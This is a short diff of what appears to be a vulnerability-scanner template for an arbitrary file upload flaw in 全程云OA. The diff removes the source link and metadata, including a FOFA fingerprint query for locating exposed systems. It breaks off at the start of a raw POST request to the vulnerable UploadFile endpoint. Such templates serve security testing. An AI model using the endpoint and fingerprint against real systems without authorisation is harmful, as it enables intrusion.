@@ -3,12 +3,8 @@ info:
   name: 全程云OA UploadFile存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/me603c4wikust4pc'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: me603c4wikust4pc
-    fofa: body="images/yipeoplehover.png"
 http:
 - raw:
   - 'POST /OA/api/2.0/Common/AttachFile/UploadFile HTTP/1.1
